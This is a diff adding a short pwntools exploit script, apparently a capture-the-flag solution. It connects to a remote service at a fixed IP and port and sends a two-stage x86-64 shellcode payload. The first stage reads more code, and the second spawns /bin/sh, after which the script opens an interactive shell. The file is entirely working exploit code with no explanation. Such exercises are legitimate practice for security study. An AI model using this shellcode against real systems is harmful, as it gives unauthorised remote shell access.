@@ -1,0 +1,15 @@
+from pwn import *
+
+
+read_code_shellcode = b'\x48\x8b\x30\x48\x83\xc6\x14\xba\x50\x00\x00\x00\x48\x31\xc0\x0f\x05\x90\x90\x90'
+shellcode = b'\x48\x89\xf4\x48\x83\xc4\x3c\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+
+context.terminal = ['tmux', 'split-w', '-h']
+
+# io = process('./problem')
+io = remote('114.177.250.4', 2210)
+
+io.recvuntil(b'Input your shellcode: ')
+io.send(read_code_shellcode)
+io.send(shellcode)
+io.interactive()
